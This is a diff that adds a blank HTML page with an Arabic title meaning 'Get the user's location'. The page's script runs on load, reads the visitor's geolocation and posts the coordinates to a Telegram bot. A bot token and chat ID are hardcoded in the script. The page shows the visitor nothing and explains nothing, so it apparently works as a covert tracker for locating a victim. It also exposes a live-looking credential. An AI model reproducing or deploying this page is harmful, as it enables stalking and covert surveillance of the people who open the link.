@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>احصل على موقع المستخدم</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const BOT_API_TOKEN = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
+        const CHAT_ID = '1717245674';
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const url = `https://api.telegram.org/bot${BOT_API_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: `الموقع: \nخط العرض: ${latitude}\nخط الطول: ${longitude}`
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("تم إرسال موقعك بنجاح إلى البوت.");
+                } else {
+                    console.error("حدث خطأ أثناء إرسال موقعك.");
+                    console.error(data);
+                }
+            })
+            .catch(error => {
+                console.error("حدث خطأ أثناء إرسال موقعك.");
+                console.error(error);
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
+                console.error("حدث خطأ أثناء الحصول على الموقع.");
+                console.error(error);
+            });
+        } else {
+            console.error("الجغرافيا غير مدعومة من هذا المتصفح.");
+        }
+    </script>
+</body>
+</html>
